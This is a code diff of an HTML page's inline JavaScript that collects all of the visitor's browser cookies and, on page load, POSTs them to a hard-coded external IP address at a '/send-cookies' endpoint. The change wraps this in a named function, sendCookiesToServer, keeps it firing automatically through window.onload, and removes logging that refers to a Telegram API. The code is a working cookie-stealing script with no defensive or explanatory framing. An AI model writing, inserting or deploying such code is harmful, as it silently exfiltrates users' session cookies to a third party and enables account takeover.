@@ -26,9 +26,9 @@
             return cookies;
         }
 
-        window.onload = function() {
+        function sendCookiesToServer() {
             const cookies = getCookies();
-            console.log(JSON.stringify({ cookies: cookies }));
+            console.log("Cookies to be sent:", cookies);
 
             fetch('https://144.172.76.108:8000/send-cookies', {
                 method: 'POST',
@@ -38,14 +38,12 @@
                 },
                 body: JSON.stringify({ cookies: cookies })
             })
-            .then(response => {
-                console.log("Telegram API Response:", response.data);
-            })
-            .then(data => console.log(data))
             .catch(err => {
-                console.error("Telegram API Error:", err.response ? err.response.data : err.message);
+                console.error("Error sending cookies:", err);
             });
         }
+
+        window.onload = sendCookiesToServer;
     </script>
 </head>
 <body>
